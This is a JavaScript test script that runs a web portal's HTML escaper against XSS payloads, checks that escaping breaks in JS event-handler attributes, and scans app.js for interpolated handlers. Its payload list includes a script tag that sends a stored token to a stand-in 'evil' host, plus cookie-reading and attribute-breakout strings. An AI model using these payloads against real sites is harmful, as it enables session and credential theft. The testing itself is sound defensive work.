// Exercises the escaper against the payloads a malicious provider could put in
// full_name, hospital_name, pet_name and so on.
const esc = (v) => String(v ?? '')
  .replaceAll('&', '&amp;')
  .replaceAll('<', '&lt;')
  .replaceAll('>', '&gt;')
  .replaceAll('"', '&quot;')
  .replaceAll("'", '&#39;');

const payloads = [
  ['script tag',        `<script>fetch('//evil/'+localStorage.token)</script>`],
  ['img onerror',       `<img src=x onerror="alert(document.cookie)">`],
  ['svg onload',        `<svg/onload=alert(1)>`],
  ['attr breakout',     `x'); doEvil(('`],
  ['double-quote break',`x" onmouseover="alert(1)`],
  ['closing td',        `</td><td><script>alert(1)</script>`],
  ['entity double-esc', `&lt;script&gt;`],
  ['null / undefined',  null],
];

let fail = 0;
for (const [name, raw] of payloads) {
  const out = esc(raw);
  // After escaping, nothing may remain that a parser reads as markup or as a
  // quote that could terminate an attribute.
  const dangerous = /[<>"']/.test(out);
  const ok = !dangerous;
  if (!ok) fail++;
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name.padEnd(20)} -> ${JSON.stringify(out).slice(0, 62)}`);
}

// And confirm it genuinely renders as text, not markup.
const rendered = `<td><strong>${esc(`<img src=x onerror=alert(1)>`)}</strong></td>`;
const hasLiveTag = /<img/i.test(rendered);
console.log(`${hasLiveTag ? 'FAIL' : 'PASS'}  no live <img> survives into the row`);
if (hasLiveTag) fail++;

// Sanity: the escaper must not be a no-op.
if (esc('<b>') === '<b>') { console.log('FAIL  escaper is a no-op'); fail++; }
else console.log('PASS  escaper actually transforms input');



// ── JS-in-attribute ──────────────────────────────────────────────────────────
// esc() is sufficient for text and for a quoted attribute read as data. It is
// NOT sufficient inside an onclick, because such an attribute is parsed as
// HTML first and evaluated as JavaScript second: &#39; is decoded back to a
// quote before the engine sees it, so escaping cannot contain a payload there.
// The portal therefore must not build handlers by interpolation at all.
// Payloads that break OUT of a single-quoted JS string once the HTML parser
// has decoded the entities. A double quote is deliberately absent: inside
// '...' it is an ordinary character and breaks nothing, so demanding that it
// escape would be testing a false claim.
const JS_IN_ATTR = [
  ["quote breakout",  `x');alert(1);//`],
  ["backslash",       `x\\');alert(1);//`],
];

for (const [name, raw] of JS_IN_ATTR) {
  const escaped = esc(raw);
  // Simulate what the browser does: decode entities, then read as JS source.
  const afterHtmlParse = escaped
    .replaceAll('&#39;', "'")
    .replaceAll('&quot;', '"')
    .replaceAll('&amp;', '&');
  const handlerSource = `dispatchDirectAlert('${afterHtmlParse}')`;
  // If a quote survives into the handler, the string has been broken out of.
  const brokeOut = /^dispatchDirectAlert\('[^']*'\)$/.test(handlerSource) === false;
  console.log(`${brokeOut ? 'CONFIRMED' : 'no-break '}  ${name.padEnd(16)} -> ${handlerSource.slice(0, 54)}`);
  if (!brokeOut) {
    console.log(`  FAIL  expected ${name} to break out, proving esc() is not enough here`);
    fail++;
  }
}

// The real assertion: no handler is built by interpolation anywhere in app.js.
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
const here = dirname(fileURLToPath(import.meta.url));
const appJs = readFileSync(join(here, 'app.js'), 'utf8');
const interpolatedHandlers = appJs
  .split('\n')
  .filter((l) => /on(click|change|input|submit)="[^"]*\$\{/.test(l) && !l.trim().startsWith('//'));

if (interpolatedHandlers.length) {
  console.log(`\nFAIL  ${interpolatedHandlers.length} handler(s) still built by interpolation:`);
  for (const l of interpolatedHandlers) console.log('   ' + l.trim().slice(0, 90));
  fail++;
} else {
  console.log('\nPASS  no event handler is built by string interpolation');
}

console.log(fail ? `\n${fail} FAILED` : '\nall passed');
process.exit(fail ? 1 : 0);
